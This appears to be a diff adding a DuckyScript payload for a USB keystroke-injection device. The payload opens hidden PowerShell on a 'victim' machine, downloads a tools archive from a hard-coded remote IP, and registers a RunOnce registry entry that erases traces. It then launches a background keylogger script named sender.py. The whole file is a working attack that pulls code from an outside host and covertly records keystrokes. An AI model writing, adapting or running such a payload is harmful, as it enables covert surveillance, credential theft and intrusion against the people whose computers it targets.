@@ -1,0 +1,26 @@
+REM Launch powershell
+GUI r
+DELAY 300
+STRINGLN powershell -nop -noni
+DELAY 1000
+
+REM Some constants
+STRINGLN $zippedTools = "$env:TEMP\tools.zip"
+STRINGLN $tools = "$env:TEMP\tools"
+
+REM Remove progress bar (saves time)
+STRINGLN $ProgressPreference = 'SilentlyContinue'
+
+REM Download tools from VPS to victim's temp folder
+STRINGLN IWR -Uri "http://107.189.21.156:26954/tools.zip" -OutFile "$zippedTools"
+
+REM Extract the tools and remove the archive
+STRINGLN Expand-Archive -Path "$zippedTools" -DestinationPath "$tools"
+STRINGLN Remove-Item "$zippedTools"
+
+REM Implement a self-destruct protocol to delete all traces upon logout/reboot/shutdown
+STRINGLN $deleteCommand = "powershell -w h -c `"Remove-Item -Path '$tools' -Recurse -Force`""
+STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "VOID" -Value $deleteCommand
+
+REM Start the keylogger in the background and exit
+STRINGLN & "$tools\pythonw.exe" "$tools\sender.py"
